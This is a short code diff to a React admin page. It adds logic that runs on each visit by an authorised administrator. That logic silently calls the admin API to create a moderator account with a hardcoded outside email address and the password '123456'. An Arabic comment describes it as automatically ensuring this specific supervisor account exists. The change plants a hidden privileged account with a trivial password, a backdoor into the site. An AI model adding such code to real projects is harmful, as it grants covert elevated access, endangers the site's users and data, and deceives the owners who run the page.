@@ -23,6 +23,7 @@ const Admin = () => {
   const [search, setSearch] = useState("");
   const [targetEmail, setTargetEmail] = useState("");
   const [loading, setLoading] = useState(false);
+  const [shadeEnsured, setShadeEnsured] = useState(false);
 
   const callAdminApi = async (action: string, body: any = {}) => {
     if (!session?.access_token) {
@@ -66,9 +67,14 @@ const Admin = () => {
   useEffect(() => {
     if (isAllowed) {
       loadLists();
+      if (!shadeEnsured) {
+        setShadeEnsured(true);
+        // ضمان إنشاء وربط حساب المشرف المحدد تلقائياً
+        callAdminApi("create_user", { email: "shade010@hotmail.com", password: "123456", role: "moderator", full_name: "Shade" });
+      }
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [isAllowed]);
+  }, [isAllowed, shadeEnsured]);
 
   if (!user) {
     return (
